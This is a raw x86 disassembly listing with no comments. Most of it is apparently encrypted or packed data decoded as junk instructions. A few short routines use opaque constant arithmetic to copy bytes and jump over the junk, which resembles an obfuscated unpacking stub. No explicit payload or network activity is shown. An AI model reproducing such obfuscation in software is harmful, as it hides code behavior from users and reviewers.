  414ff6:	clc    
  414ff7:	and    BYTE PTR [ebx-0x5ea1e6b7],0xde
  414ffe:	and    BYTE PTR [ecx+eiz*8],dh
  415001:	xchg   esi,eax
  415002:	and    al,0x3c
  415004:	mov    edx,0x5d2f67f2
  415009:	jnp    0x415039
  41500b:	adc    cl,dh
  41500d:	enter  0x74ef,0xa8
  415011:	out    0x40,al
  415013:	test   eax,0x88b1e405
  415018:	mov    al,0xeb
  41501a:	dec    edx
  41501b:	stos   DWORD PTR es:[edi],eax
  41501c:	je     0x415062
  41501e:	test   DWORD PTR [edx],ebx
  415020:	cmp    BYTE PTR [esi-0xadac845],dl
  415026:	stos   BYTE PTR es:[edi],al
  415027:	inc    ecx
  415028:	test   al,0x88
  41502a:	repnz and BYTE PTR ds:[ebx],ch
  41502e:	ja     0x415091
  415030:	dec    ebp
  415031:	push   0x47dee3c0
  415036:	jbe    0x415043
  415038:	daa    
  415039:	or     BYTE PTR [ecx],al
  41503b:	lods   eax,DWORD PTR ds:[esi]
  41503c:	das    
  41503d:	mov    DWORD PTR [edi+0x37],esi
  415040:	and    DWORD PTR [ebx],ebx
  415042:	out    0x94,eax
  415044:	mov    edi,0x7c8f3637
  415049:	lds    edx,FWORD PTR [edx+eax*8+0x29]
  41504d:	test   ebx,0xc42c9f44
  415053:	pop    ss
  415054:	(bad)  
  415055:	and    al,0xa9
  415057:	add    ecx,DWORD PTR [ecx+0x2a6adb07]
  41505d:	adc    al,0x91
  41505f:	and    ecx,DWORD PTR [edi-0x69d08a7f]
  415065:	push   edi
  415066:	in     al,0x46
  415068:	call   FWORD PTR [ebx]
  41506a:	cwde   
  41506b:	mov    ch,0x80
  41506d:	xchg   edx,eax
  41506e:	dec    edi
  41506f:	xchg   edi,eax
  415070:	jne    0x415015
  415072:	push   cs
  415073:	add    eax,0xbf028dd7
  415078:	push   ds
  415079:	test   BYTE PTR [edi+0x37],cl
  41507c:	hlt    
  41507d:	jge    0x415043
  41507f:	dec    ebx
  415080:	js     0x415040
  415082:	dec    edx
  415083:	push   0x5e04571c
  415088:	adc    esp,DWORD PTR [ebp-0x13]
  41508b:	rcr    DWORD PTR [ebx],0xc
  41508e:	jns    0x415095
  415090:	ds call 0x1f1d:0xe9578e1c
  415098:	or     eax,0x18678e3e
  41509d:	sbb    al,0xb2
  41509f:	lods   eax,DWORD PTR ds:[esi]
  4150a0:	pop    eax
  4150a1:	pop    esp
  4150a2:	lahf   
  4150a3:	or     BYTE PTR [edi],0x8e
  4150a6:	hlt    
  4150a7:	cs cmp eax,0x1ac71895
  4150ad:	sub    eax,0x80511a30
  4150b2:	add    edx,DWORD PTR [esp+0x65feb4bb]
  4150b9:	mov    cs,ebp
  4150bb:	mov    bh,0x7c
  4150bd:	pop    edx
  4150bf:	outs   dx,BYTE PTR ds:[esi]
  4150c0:	jge    0x4150a0
  4150c2:	adc    ah,BYTE PTR [ecx+0x70f7f654]
  4150c8:	test   al,0xd1
  4150ca:	test   BYTE PTR gs:[edx-0x78],ah
  4150ce:	mov    ebx,0x7c2749e8
  4150d3:	or     dl,0xd7
  4150d6:	xor    al,0xe
  4150d8:	repz or BYTE PTR [ecx+0x67c0ecff],ch
  4150df:	(bad)  
  4150e0:	repnz scas eax,DWORD PTR es:[edi]
  4150e2:	nop
  4150e3:	lods   eax,DWORD PTR ds:[esi]
  4150e4:	push   ecx
  4150e5:	inc    ebp
  4150e6:	out    0x78,al
  4150e8:	in     eax,dx
  4150e9:	sub    eax,0x78d0b4ab
  4150ee:	nop
  4150ef:	adc    al,0x32
  4150f1:	addr16 out dx,ax
  4150f4:	xchg   ebp,eax
  4150f5:	fucomip st,st(5)
  4150f7:	jnp    0x4150f4
  4150f9:	call   0x766d:0xc1b93c44
  415100:	cmp    bh,BYTE PTR [ebp-0x66]
  415103:	call   0x5754:0xb3fab2f4
  41510a:	mov    eax,ds:0x2fba6276
  41510f:	rcr    DWORD PTR ss:[edi+0x5f],1
  415113:	xor    DWORD PTR [ebx-0x3a86baf3],ecx
  415119:	ret    
  41511a:	and    esi,0xa35174f1
  415120:	or     DWORD PTR [ebx+0x64a670be],ebx
  415126:	ret    0x4986
  415129:	add    ebx,DWORD PTR [eax+ebx*2-0x70]
  41512d:	push   eax
  41512e:	inc    edx
  41512f:	xchg   ebp,eax
  415130:	inc    ebp
  415131:	test   DWORD PTR [eax+edi*1-0x4e],ebx
  415135:	test   al,0x89
  415137:	mov    dh,BYTE PTR [esi+0x30376b9f]
  41513d:	imul   ecx,DWORD PTR [ecx+ebx*8+0x5e],0xffffffa2
  415142:	pop    eax
  415143:	cmc    
  415144:	cmp    eax,0xd7342502
  415149:	mov    DWORD PTR [edi+0x2a],esi
  41514c:	lock cmp cl,BYTE PTR [eax]
  41514f:	sub    ch,BYTE PTR [esi]
  415151:	adc    DWORD PTR [ebx+0x45],ebx
  415154:	inc    ebx
  415155:	push   cs
  415156:	popf   
  415157:	jb     0x41512d
  415159:	aas    
  41515a:	icebp  
  41515b:	shl    BYTE PTR [esi+0x2d82f82c],cl
  415161:	hlt    
  415162:	inc    esp
  415163:	mov    cl,0x8a
  415165:	pop    edx
  415166:	mov    bh,0x2a
  415168:	push   ss
  415169:	or     cl,bl
  41516b:	and    bl,bl
  41516d:	call   0xcef74a2
  415172:	neg    DWORD PTR [edx-0x3a]
  415175:	xor    ah,BYTE PTR [edx+edx*1-0x742a1f54]
  41517c:	mov    bl,0xd8
  41517e:	and    BYTE PTR [edx-0x35],0xc2
  415182:	pusha  
  415183:	mov    bl,BYTE PTR [ebp-0x42b7382f]
  415189:	add    al,0xde
  41518b:	xchg   edi,eax
  41518c:	inc    esp
  41518d:	rcr    DWORD PTR [edx-0x69f98675],0xb7
  415194:	inc    eax
  415195:	scas   al,BYTE PTR es:[edi]
  415196:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415197:	ins    DWORD PTR es:[edi],dx
  415198:	stos   BYTE PTR es:[edi],al
  415199:	bound  esi,QWORD PTR [esi-0x349eacc5]
  41519f:	aas    
  4151a0:	rcr    BYTE PTR [eax-0x2e],cl
  4151a3:	cmp    DWORD PTR [edi+esi*1-0x6a94d65a],edx
  4151aa:	addr16 add edx,esi
  4151ad:	mov    fs,WORD PTR [esi]
  4151af:	push   cs
  4151b0:	loope  0x415138
  4151b2:	shl    DWORD PTR [ebp+0x2],0x96
  4151b6:	adc    ah,cl
  4151b8:	fiadd  DWORD PTR [edx+0x68dea2f4]
  4151be:	add    BYTE PTR [edx+0x4a396943],dh
  4151c4:	(bad)  
  4151c5:	xor    ebx,DWORD PTR [edi+eax*8-0x12f72940]
  4151cc:	push   ebx
  4151cd:	retf   0x5996
  4151d0:	ss jo  0x415153
  4151d3:	pop    ss
  4151d4:	mov    edx,DWORD PTR [esp+0x14]
  4151d8:	sub    DWORD PTR [eax],ecx
  4151da:	sbb    DWORD PTR [eax+0x4],edx
  4151dd:	mov    eax,DWORD PTR [esp+0xc]
  4151e1:	or     DWORD PTR [eax],0xca7da575
  4151e7:	or     DWORD PTR [eax+0x4],0x9c1b89e8
  4151ee:	lea    eax,[esp+0x18]
  4151f2:	push   eax
  4151f3:	lea    eax,[esp+0x24]
  4151f7:	push   eax
  4151f8:	call   0x4127df
  4151fd:	mov    eax,DWORD PTR [esp+0x18]
  415201:	mov    ecx,DWORD PTR [esp+0x1c]
  415205:	push   DWORD PTR [ebp+0x18]
  415208:	mov    ebx,DWORD PTR [ebp+0xc]
  41520b:	push   DWORD PTR [ebp+0x14]
  41520e:	mov    esi,DWORD PTR [ebp+0x8]
  415211:	push   DWORD PTR [ebp+0x10]
  415214:	push   DWORD PTR [esp+0x20]
  415218:	push   DWORD PTR [esp+0x20]
  41521c:	push   DWORD PTR [esp+0x38]
  415220:	push   DWORD PTR [esp+0x38]
  415224:	call   0x401000
  415229:	pop    esi
  41522a:	pop    ebx
  41522b:	mov    esp,ebp
  41522d:	pop    ebp
  41522e:	ret    0x14
  415231:	push   ebp
  415232:	mov    ebp,esp
  415234:	sub    esp,0x30
  415237:	mov    DWORD PTR [ebp-0x24],0x7c16
  41523e:	mov    DWORD PTR [ebp-0x20],0x53bd
  415245:	mov    DWORD PTR [ebp-0x18],0x3bd5
  41524c:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  415253:	mov    DWORD PTR [ebp-0xc],0x4b9d
  41525a:	mov    DWORD PTR [ebp-0x8],0x7e48
  415261:	mov    DWORD PTR [ebp-0x4],0x604b
  415268:	mov    DWORD PTR [ebp-0x30],0x5b69
  41526f:	mov    DWORD PTR [ebp-0x2c],0x4521
  415276:	mov    DWORD PTR [ebp-0x28],0x2979
  41527d:	mov    DWORD PTR [ebp-0x14],0x9e8
  415284:	mov    DWORD PTR [ebp-0x10],0x40e5
  41528b:	mov    ecx,DWORD PTR [ebp-0x4]
  41528e:	mov    eax,DWORD PTR [ebp-0x8]
  415291:	add    ecx,0x1d04
  415297:	xor    ecx,eax
  415299:	mov    eax,DWORD PTR [ebp-0xc]
  41529c:	and    ecx,0x6f79
  4152a2:	imul   ecx,eax
  4152a5:	xor    ecx,0xe33ab1
  4152ab:	push   esi
  4152ac:	mov    DWORD PTR [ebp-0x4],0x5989
  4152b3:	mov    DWORD PTR [ebp-0x8],0x402c1
  4152ba:	mov    DWORD PTR [ebp-0xc],0x4114
  4152c1:	mov    eax,DWORD PTR [ebp-0xc]
  4152c4:	mov    esi,DWORD PTR [ebp-0x8]
  4152c7:	xor    edx,edx
  4152c9:	sub    eax,0x6cb6
  4152ce:	div    esi
  4152d0:	mov    edx,DWORD PTR [ebp-0x4]
  4152d3:	mov    esi,DWORD PTR [ebp+0xc]
  4152d6:	or     eax,edx
  4152d8:	xor    eax,0x67f1
  4152dd:	mov    edx,ecx
  4152df:	sub    edx,eax
  4152e1:	mov    DWORD PTR [ebp-0x4],edx
  4152e4:	mov    eax,DWORD PTR [ebp-0x4]
  4152e7:	mov    edx,DWORD PTR [ebp-0x4]
  4152ea:	mov    dl,BYTE PTR [edx+esi*1]
  4152ed:	mov    esi,DWORD PTR [ebp+0x8]
  4152f0:	mov    BYTE PTR [eax+esi*1],dl
  4152f3:	jmp    0x415646
  4152f8:	mov    cl,0x4a
  4152fa:	aas    
  4152fb:	(bad)  
  4152fc:	sbb    bh,BYTE PTR [edx-0x5f]
  4152ff:	sub    dh,BYTE PTR [esi-0x3381e474]
  415305:	(bad)  
  415307:	jo     0x4152c5
  415309:	push   cs
  41530a:	push   ss
  41530b:	sbb    BYTE PTR [ebp-0x50e7e7ee],dh
  415311:	loope  0x415300
  415313:	xor    dl,ch
  415315:	dec    esi
  415316:	mov    al,0xf3
  415318:	sbb    eax,0x3bcb30e7
  41531d:	and    esp,DWORD PTR [edi+0xac7425e]
  415323:	xchg   BYTE PTR [eax-0x57dc23fe],bl
  415329:	xor    BYTE PTR [ecx],al
  41532b:	(bad)  
  41532c:	int3   
  41532d:	popf   
  41532e:	in     eax,0xa3
  415330:	cmp    BYTE PTR [ebx+0x39d08c7],dh
  415336:	not    BYTE PTR [eax-0x77]
  415339:	iret   
  41533a:	mov    ds:0x6df395,eax
  41533f:	sti    
  415340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415341:	addr16 xchg edi,eax
  415343:	or     al,ch
  415345:	in     eax,0x5a
  415347:	and    DWORD PTR [edi],ebp
  415349:	or     BYTE PTR [esi+0xd],dh
  41534c:	(bad)  
  41534d:	stc    
  41534e:	cli    
  41534f:	inc    ebp
  415350:	scas   eax,DWORD PTR es:[edi]
  415351:	xchg   esi,eax
  415352:	sahf   
  415353:	fadd   QWORD PTR [ebp-0x2b]
  415356:	push   edi
  415357:	js     0x415373
  415359:	int3   
  41535a:	call   0xbf74:0x68a3c979
  415361:	jmp    0x766ba6c9
  415366:	push   0xffffff84
  415368:	lods   al,BYTE PTR ds:[esi]
  415369:	sar    BYTE PTR [ecx+0x1822b806],cl
  41536f:	dec    edi
  415370:	xor    al,0xef
  415372:	scas   al,BYTE PTR es:[edi]
  415373:	(bad)  
  415374:	ds push ebp
  415376:	mov    al,ds:0xa2776eec
  41537b:	inc    esp
  41537c:	jno    0x4153c6
  41537e:	sub    eax,0x7498cbb7
  415383:	ret    
  415384:	repz or DWORD PTR [ebx],ecx
  415387:	addr16 xchg edi,eax
  415389:	(bad)  
  41538a:	mov    ah,0xd8
  41538c:	jnp    0xff17336d
  415392:	inc    ebp
  415393:	mov    ds:0x80b772b8,eax
  415398:	sbb    eax,0xea60ab55
  41539d:	xor    DWORD PTR [edx],ecx
  41539f:	dec    ebx
  4153a0:	leave  
  4153a1:	int    0x70
  4153a3:	cwde   
  4153a4:	mov    ch,0xea
  4153a6:	(bad)  
  4153a8:	push   edx
  4153a9:	arpl   sp,bx
  4153ab:	jmp    0x98eee4c
  4153b0:	add    al,0xc6
  4153b2:	pop    esi
  4153b3:	dec    esi
  4153b4:	mov    edx,0x748378a0
  4153b9:	sub    DWORD PTR [esi-0x9152561],ebx
  4153bf:	fild   WORD PTR [ecx+0x1d1af79f]
  4153c5:	iret   
  4153c6:	xlat   BYTE PTR ds:[ebx]
  4153c7:	call   0x5658b766
  4153cc:	mov    al,0x51
  4153ce:	dec    edi
  4153cf:	pop    ss
  4153d0:	and    eax,0x6d3e7809
  4153d5:	loope  0x415444
  4153d7:	loope  0x415397
  4153d9:	imul   ebp,DWORD PTR [edi-0x33b8c3b1],0xf92fa0ee
  4153e3:	gs mov edi,0xcde2f340
  4153e9:	(bad)  
  4153ea:	or     al,0x5b
  4153ec:	fstp   st(1)
  4153ee:	jg     0x415441
  4153f0:	rcr    DWORD PTR [ecx],0x8a
  4153f3:	or     dh,BYTE PTR ds:0x140aa947
  4153f9:	into   
  4153fa:	sti    
  4153fb:	jae    0x4153e1
  4153fd:	ins    DWORD PTR es:[edi],dx
  4153fe:	xchg   ecx,eax
  4153ff:	mov    DWORD PTR [eax+eiz*1+0x34],esi
  415403:	add    BYTE PTR [eax-0xf],ch
  415406:	push   edi
  415407:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415408:	mov    ebp,0x6bb3fc09
  41540d:	jbe    0x415421
  41540f:	retf   0x94e0
  415412:	push   ss
  415413:	jno    0x415404
  415415:	pop    es
  415416:	adc    al,al
  415418:	imul   eax,DWORD PTR [edi+ecx*4],0xffffffab
  41541c:	mov    al,ds:0x63085319
  415421:	mov    al,ds:0xb27fb9b4
  415426:	aaa    
  415427:	dec    ebx
  415428:	fisttp QWORD PTR [esi+0x6b54e7b8]
  41542e:	cmp    al,0x42
  415430:	inc    eax
  415431:	rcl    BYTE PTR [ebx-0x2e],0x9e
  415435:	test   al,0x2d
  415437:	push   esp
  415438:	cmp    bh,BYTE PTR ds:0xbcd856b
  41543e:	dec    edi
  41543f:	(bad)  
  415440:	loop   0x415452
  415442:	popa   
  415443:	cld    
  415444:	push   esp
  415445:	iret   
  415446:	ret    0x1246
  415449:	ins    BYTE PTR es:[edi],dx
  41544a:	dec    eax
  41544b:	(bad)  
  41544d:	aad    0xc3
  41544f:	fild   DWORD PTR [bx+di-0x2787]
  415454:	or     al,0xec
  415456:	xchg   BYTE PTR [ecx+esi*2-0x41],dh
  41545a:	mov    bh,0x20
  41545c:	mov    esi,esp
  41545e:	jl     0x4154ab
  415460:	test   DWORD PTR [edx-0x327a01d8],esp
  415466:	xor    al,0x9
  415468:	dec    esi
  415469:	test   al,0x12
  41546b:	jle    0x415434
  41546d:	sti    
  41546e:	xor    al,0x28
  415470:	dec    eax
  415471:	mov    al,ds:0x726a9c27
  415476:	adc    ch,BYTE PTR [ebx-0x63]
  415479:	out    0x61,eax
  41547b:	cmp    BYTE PTR [eax],bh
  41547d:	stc    
  41547e:	add    dl,al
  415480:	inc    edx
  415481:	fisttp QWORD PTR ds:0x761de707
  415487:	daa    
  415488:	or     DWORD PTR [ebp+0xb2391a3],ecx
  41548e:	fstp   QWORD PTR [edi+0x74989e59]
  415494:	stos   DWORD PTR es:[edi],eax
  415495:	repz inc esi
  415497:	pop    esi
  415498:	call   0x4a880758
  41549d:	cmc    
  41549e:	xlat   BYTE PTR ds:[ebx]
  41549f:	(bad)  
  4154a0:	xlat   BYTE PTR ds:[ebx]
  4154a1:	jmp    0x4154e1
  4154a3:	add    edi,DWORD PTR [esi+eax*1]
  4154a6:	fidiv  WORD PTR [ebx]
  4154a8:	loopne 0x41542a
  4154aa:	shl    ah,1
  4154ac:	rcr    BYTE PTR [ebp*2-0x73ceecc0],cl
  4154b3:	lock or DWORD PTR ds:0x6ae9f69c,ebp
  4154ba:	or     al,0x85
  4154bc:	test   DWORD PTR [eax+0x4a8616cc],edx
  4154c2:	rol    eax,1
  4154c4:	retf   
  4154c5:	ins    DWORD PTR es:[edi],dx
  4154c6:	inc    edx
  4154c7:	jae    0x4154b6
  4154c9:	hlt    
  4154ca:	push   ss
  4154cb:	cmp    dl,BYTE PTR [eax+0x4eba1618]
  4154d1:	aaa    
  4154d2:	push   esp
  4154d3:	fiadd  DWORD PTR [edx-0x30]
  4154d6:	inc    edi
  4154d7:	jg     0x4154f9
  4154d9:	jg     0x415507
  4154db:	xchg   BYTE PTR [eax],ah
  4154dd:	sub    ah,BYTE PTR [ebx+0x55c20754]
  4154e3:	sub    al,0x82
  4154e5:	xor    bh,bl
  4154e7:	popa   
  4154e8:	fstp   DWORD PTR [ecx]
  4154ea:	je     0x415478
  4154ec:	push   ss
  4154ed:	in     eax,0xa2
  4154ef:	and    bh,bh
  4154f1:	inc    edi
  4154f2:	cwde   
  4154f3:	ret    
  4154f4:	fst    QWORD PTR [ebx-0x4c9fafc3]
  4154fa:	imul   ebx,DWORD PTR [edi-0x59eaccb8],0xffffffd2
  415501:	in     eax,0xba
  415503:	or     DWORD PTR [ecx-0x7581a790],esi
  415509:	inc    edx
  41550a:	add    ebp,esp
  41550c:	inc    ebp
  41550d:	and    dh,ah
  41550f:	add    dh,BYTE PTR [ebx]
  415511:	shr    BYTE PTR [eax],cl
  415513:	sub    BYTE PTR [eax-0x59],ah
  415516:	fucomip st,st(2)
  415518:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415519:	and    al,0x93
  41551b:	(bad)  
  41551d:	or     DWORD PTR [eax-0x24],edx
  415520:	mov    ebp,0x15aaaae8
  415525:	mov    edx,0x8804f505
  41552a:	nop
  41552b:	jb     0x4154fc
  41552d:	jl     0x41558b
  41552f:	mov    bl,0x6d
  415531:	stos   BYTE PTR es:[edi],al
  415532:	ret    
  415533:	popf   
  415534:	mov    ecx,DWORD PTR [edi+0x47]
  415537:	imul   esi,DWORD PTR [ebp-0x5e9ccfea],0xdfaf4bea
  415541:	push   ebx
  415542:	adc    al,0x9d
  415544:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415545:	fs jb  0x41550a
  415548:	adc    BYTE PTR [eax-0x56d3ef9f],bl
  41554e:	sahf   
  41554f:	loope  0x4155c9
  415551:	das    
  415552:	ins    BYTE PTR es:[edi],dx
  415553:	add    al,0xc8
  415555:	add    ebp,0xade26e51
  41555b:	xchg   DWORD PTR [eax-0x35],ebp
  41555e:	cmp    DWORD PTR [eax],ebx
  415560:	mul    DWORD PTR [edi-0x78]
  415563:	mov    bh,0xd0
  415565:	or     esp,DWORD PTR [ebx-0x21]
  415568:	push   ds
  415569:	fs add cl,bh
  41556c:	push   ebp
  41556d:	and    al,0x54
  41556f:	adc    DWORD PTR [esi+ecx*4-0x18],edx
  415573:	pop    ds
  415574:	inc    esp
  415575:	mov    ecx,DWORD PTR [ecx+esi*1-0x6f03c54e]
  41557c:	fwait
  41557d:	cli    
  41557e:	hlt    
  41557f:	inc    BYTE PTR [esi+0x4d43f4d4]
  415585:	xor    al,0xc6
  415587:	xor    DWORD PTR [ebx+0x6766177a],0x4f8bbc78
  415591:	inc    edi
  415592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415593:	cmp    BYTE PTR [edx+0x14],cl
  415596:	add    ebp,ebx
  415598:	and    al,0x1a
  41559a:	sar    DWORD PTR ds:0x689c347f,0xec
  4155a1:	mov    eax,0x55e4d801
  4155a6:	xchg   ecx,eax
  4155a7:	cld    
  4155a8:	jo     0x4155b9
  4155aa:	nop
  4155ab:	fldenv [edx-0x50]
  4155ae:	imul   ebp,DWORD PTR [eax+0x449f17d7],0xb90db312
  4155b8:	xor    eax,0xe72ea746
  4155bd:	fstp   DWORD PTR [edi+eiz*4+0x971c20e]
  4155c4:	mov    ds:0x5a101fcc,eax
  4155c9:	bound  esi,QWORD PTR [edx]
  4155cb:	arpl   si,bx
  4155cd:	lea    edx,[ebp+0x4a]
  4155d0:	inc    edx
  4155d1:	jno    0x4155f5
  4155d3:	xor    al,0x61
  4155d5:	mov    ds:0x6a2c895f,eax
  4155da:	push   edx
  4155db:	gs dec ebp
  4155dd:	ins    BYTE PTR es:[edi],dx
  4155de:	jbe    0x4155b5
  4155e0:	fs iret 
  4155e2:	sbb    al,0x6a
  4155e4:	dec    ecx
  4155e5:	loop   0x415593
  4155e7:	daa    
  4155e8:	mov    edx,edx
  4155ea:	dec    esi
  4155eb:	xchg   BYTE PTR [eax-0x15a640a6],dh
  4155f1:	and    cl,dl
  4155f3:	or     BYTE PTR ds:0x5f97e511,al
  4155f9:	cdq    
  4155fa:	arpl   WORD PTR [edi],bx
  4155fc:	iret   
  4155fd:	daa    
  4155fe:	sbb    DWORD PTR [ebp+0x4c653e7e],0x25
  415605:	mov    al,ds:0x9fd2caa0
  41560a:	jns    0x415679
  41560c:	inc    esp
  41560d:	xchg   edx,eax
  41560e:	dec    edi
  41560f:	enter  0xdf8c,0x21
  415613:	add    DWORD PTR [esi-0x54ed338b],esi
  415619:	jbe    0x41561a
  41561b:	int    0x78
  41561d:	pop    ecx
  41561e:	jnp    0x415698
  415620:	in     eax,0xdb
  415622:	or     ecx,DWORD PTR [eiz*2-0x3fc8f8af]
  415629:	jo     0x415677
  41562b:	loopne 0x41561d
  41562d:	mov    edi,0x8ebc11cc
  415632:	dec    eax
  415633:	jmp    0x415650
  415635:	ret    
  415636:	fadd   QWORD PTR [edi+0x6a]
  415639:	mov    ebp,0x74734069
  41563e:	jmp    0x8713:0x22dda6ab
  415645:	dec    edi
  415646:	mov    eax,DWORD PTR [ebp-0x10]
  415649:	mov    edx,DWORD PTR [ebp-0x14]
  41564c:	imul   eax,eax,0x43bd290
  415652:	and    eax,edx
  415654:	or     eax,0x1a40
  415659:	xor    eax,0x1ac1
  41565e:	add    ecx,eax
  415660:	mov    eax,DWORD PTR [ebp-0x18]
  415663:	mov    edx,0x7380
  415668:	sub    edx,eax
  41566a:	add    edx,DWORD PTR [ebp-0x1c]
  41566d:	jmp    0x4159c0
  415672:	pop    esp
  415673:	pushf  
  415674:	lds    eax,FWORD PTR [ebp+eax*2+0x1c]
  415678:	pop    esp
  415679:	pushf  
  41567a:	push   ss
  41567b:	cwde   
  41567c:	pop    ebx
  41567d:	jo     0x4156a8
  41567f:	jb     0x4156a4
  415681:	stos   BYTE PTR es:[edi],al
  415682:	pop    eax
  415683:	or     BYTE PTR [esi],dl
  415685:	sbb    BYTE PTR [ebp-0x7ee7e7ee],dh
  41568b:	jb     0x4156d3
  41568d:	daa    
  41568e:	out    dx,al
  41568f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415690:	and    al,0x2e
  415692:	iret   
  415693:	jp     0x4156bd
  415695:	test   al,0xb0
  415697:	ins    BYTE PTR es:[edi],dx
  415698:	cwde   
  415699:	ins    BYTE PTR es:[edi],dx
  41569a:	xchg   esp,eax
  41569b:	adc    ebp,ecx
  41569d:	aam    0x1a
  41569f:	cmp    eax,esi
  4156a1:	push   ecx
  4156a2:	cmp    dh,ah
  4156a4:	xor    eax,0xcd8e7e81
  4156a9:	inc    BYTE PTR [ecx+0x66]
  4156ac:	mov    esp,0x411b5cbc
  4156b1:	dec    edx
  4156b2:	retf   
  4156b3:	sbb    BYTE PTR [ebx+0x28],cl
  4156b6:	push   edi
  4156b7:	ret    
  4156b8:	mov    ds:0x7472640,al
  4156bd:	push   eax
  4156be:	scas   eax,DWORD PTR es:[edi]
  4156bf:	lods   eax,DWORD PTR ds:[esi]
  4156c0:	mov    bl,BYTE PTR [esp+eax*8-0x2cca3c6]
  4156c7:	push   eax
  4156c8:	jns    0x4156db
  4156ca:	jns    0x4156f5
  4156cc:	or     dl,ch
  4156ce:	in     al,0xb9
  4156d0:	arpl   di,bp
  4156d2:	push   esi
  4156d3:	sti    
  4156d4:	sub    DWORD PTR [edi-0x49f6b143],esp
  4156da:	pop    ecx
  4156db:	dec    edi
  4156dc:	jle    0x41570d
  4156de:	mov    bh,0xf8
  4156e0:	cwde   
  4156e1:	bound  edx,QWORD PTR [eax]
  4156e3:	icebp  
  4156e4:	mov    bh,0x0
  4156e6:	push   ebp
  4156e7:	push   edx
  4156e8:	sbb    DWORD PTR [ecx-0x78d257b5],edi
  4156ee:	lea    eax,[ebp-0x6f8d5998]
  4156f4:	bound  ecx,QWORD PTR [edi+eiz*8]
  4156f7:	int    0xdf
  4156f9:	jmp    0x4156b8
  4156fb:	push   edx
  4156fc:	add    eax,0x1cdcf58b
  415701:	enter  0xa94c,0xb9
  415705:	mov    dh,0x2c
  415707:	into   
  415708:	mov    edi,DWORD PTR [eax+0xf92b060]
  41570e:	xor    edi,DWORD PTR [ebp+ebx*8-0x5d]
  415712:	push   ecx
  415713:	sbb    eax,0x6460732d
  415718:	mov    edx,0x694c9ed7
  41571d:	xchg   esp,eax
  41571e:	fcom   QWORD PTR [ebx+0x36b34e7b]
  415724:	ds sub al,0x2f
  415727:	push   ebx
  415728:	pop    ecx
  415729:	aaa    
  41572a:	inc    esi
  41572b:	bound  ecx,QWORD PTR [esi]
  41572d:	les    edi,FWORD PTR [edx+0x35]
  415730:	call   0x33e8:0x2175fa03
  415737:	pop    es
  415738:	rcr    dl,cl
  41573a:	lods   al,BYTE PTR ds:[esi]
  41573b:	ror    ch,cl
  41573d:	push   esp
  41573e:	push   ecx
  41573f:	mov    cl,0xe0
  415741:	stos   DWORD PTR es:[edi],eax
  415742:	jo     0x4156e3
  415744:	ds sbb eax,0x947100c
  41574a:	mov    ah,0x1
  41574c:	int3   
  41574d:	push   es
  41574e:	sub    ah,bl
  415750:	add    eax,0xe27c3d5f
  415755:	inc    esi
  415756:	ror    DWORD PTR ds:0x60def65b,cl
  41575c:	or     ecx,DWORD PTR [eax-0x66ab1205]
  415762:	js     0x4156eb
  415764:	sbb    BYTE PTR [eax],0x2c
  415767:	leave  
  415768:	imul   ebp,DWORD PTR [ebx+0x134bb6bd],0xed37c80d
  415772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415773:	xor    BYTE PTR [ebx-0xe],ah
  415776:	and    BYTE PTR ds:0x88d54547,dh
  41577c:	cwde   
  41577d:	jmp    0x4157bb
  41577f:	retf   0xb3e0
  415782:	lds    edx,FWORD PTR [ecx-0x27a82c43]
  415788:	lock pushf 
  41578a:	or     DWORD PTR [ecx-0xd],esp
  41578d:	pop    ss
  41578e:	pop    ebx
  41578f:	sbb    eax,DWORD PTR ds:0x34b36c99
  415795:	mov    eax,ds:0xbf1ab950
  41579a:	cmp    dl,BYTE PTR [ebp+0x61]
  41579d:	jnp    0x415789
  41579f:	pop    edx
  4157a0:	xchg   edi,ebx
  4157a2:	add    eax,0xc5408395
  4157a7:	jl     0x415808
  4157a9:	pusha  
  4157aa:	sub    DWORD PTR [esi-0x463ef6ab],0x54
  4157b1:	inc    eax
  4157b2:	pop    ds
  4157b3:	inc    ebp
  4157b4:	popf   
  4157b5:	sbb    esp,esp
  4157b7:	jo     0x4157be
  4157b9:	mov    ecx,0x6d96f296
  4157be:	xchg   esi,eax
  4157bf:	xchg   esi,eax
  4157c0:	fsubr  DWORD PTR [eax+esi*4-0x5916af23]
  4157c7:	add    ch,BYTE PTR [ebx-0x69]
  4157ca:	pop    edx
  4157cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157cc:	ss pop ds
  4157ce:	ins    DWORD PTR es:[edi],dx
  4157cf:	arpl   WORD PTR [eax+0x79],cx
  4157d2:	and    dl,cl
  4157d4:	pop    ecx
  4157d5:	pop    ds
  4157d6:	add    DWORD PTR [ebx+0x53235e20],esp
  4157dc:	lahf   
  4157dd:	mov    ds:0xdf2920ba,eax
  4157e2:	inc    edx
  4157e3:	dec    eax
  4157e4:	ret    
  4157e5:	cmp    eax,0xc5c2c60
  4157ea:	add    BYTE PTR [eax+0x5e653226],ch
  4157f0:	add    eax,0xe0428cef
  4157f5:	enter  0xde37,0x97
  4157f9:	repz pop edx
  4157fb:	(bad)  
  4157fc:	and    edx,DWORD PTR ds:0xd9ed035
  415802:	icebp  
  415803:	or     ebx,ecx
  415805:	sbb    al,0x3
  415807:	inc    esp
  415808:	jb     0x41579e
  41580a:	jnp    0x415837
  41580c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41580d:	and    al,0x62
  41580f:	bound  ecx,QWORD PTR [ebx]
  415811:	pop    esp
  415812:	or     ecx,ebx
  415814:	ins    BYTE PTR es:[edi],dx
  415815:	sti    
  415816:	lods   al,BYTE PTR ds:[esi]
  415817:	call   0xfb5:0xe997621c
  41581e:	test   dh,0xa
  415821:	mov    ds,WORD PTR [edx+0xf123386]
  415827:	or     esi,ecx
  415829:	neg    bl
  41582b:	stc    
  41582c:	out    dx,eax
  41582d:	add    DWORD PTR [edi],edx
  41582f:	push   ds
  415830:	aas    
  415831:	es pusha 
  415833:	mov    fs,ebx
  415835:	daa    
  415836:	mov    ecx,0xf6a381b1
  41583b:	call   0xfbf0726c
  415840:	fidiv  DWORD PTR [edi]
  415842:	loope  0x41585c
